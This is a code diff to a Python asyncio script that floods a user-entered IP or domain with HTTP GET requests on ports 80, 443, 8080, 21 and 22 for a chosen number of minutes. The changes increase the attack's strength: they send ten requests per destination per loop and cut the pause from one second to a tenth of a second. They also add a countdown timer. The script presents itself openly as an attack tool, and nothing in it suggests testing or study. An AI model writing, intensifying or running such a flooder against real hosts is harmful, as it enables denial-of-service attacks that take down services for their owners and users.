@@ -46,7 +46,7 @@ async def monitor_status(target: str, duration_seconds: int):
     end_time = time.time() + duration_seconds
     while time.time() < end_time:
         print(f"\r{bcolors.OKBLUE}Monitoring status of {target}...{bcolors.ENDC}", end="")
-        await asyncio.sleep(5)  # Check every 5 seconds
+        await asyncio.sleep(5)  # Simulate status check
     print()  # Newline after monitoring
 
 async def attack(target: str, duration_minutes: int) -> None:
@@ -71,11 +71,12 @@ async def attack(target: str, duration_minutes: int) -> None:
         tasks = []
         while loop.time() < end_time:
             for dest in protocol.destinations.keys():
-                task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
-                    f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
-                task.add_done_callback(on_task_complete)
-                tasks.append(task)
-            await asyncio.sleep(1)
+                for _ in range(10):  # Increase the number of requests sent
+                    task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
+                        f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
+                    task.add_done_callback(on_task_complete)
+                    tasks.append(task)
+            await asyncio.sleep(0.1)  # Decrease the delay between sending requests
 
         await asyncio.gather(*tasks)
         print(f"{bcolors.OKGREEN}Attack completed.{bcolors.ENDC}")
@@ -83,14 +84,24 @@ async def attack(target: str, duration_minutes: int) -> None:
     finally:
         transport.close()
 
+async def countdown(duration_seconds: int):
+    for remaining in range(duration_seconds, 0, -1):
+        mins, secs = divmod(remaining, 60)
+        timer = f"{mins:02}:{secs:02}"
+        print(f"\r{bcolors.HEADER}Time remaining: {timer}{bcolors.ENDC}", end="")
+        await asyncio.sleep(1)
+    print()  # Newline after countdown
+
 async def main():
     duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
     target = input(f"{bcolors.HEADER}Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): {bcolors.ENDC}")
     print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes...{bcolors.ENDC}")
 
+    duration_seconds = duration_minutes * 60
     await asyncio.gather(
         attack(target, duration_minutes),
-        monitor_status(target, duration_minutes * 60)
+        monitor_status(target, duration_seconds),
+        countdown(duration_seconds)
     )
 
 if __name__ == "__main__":
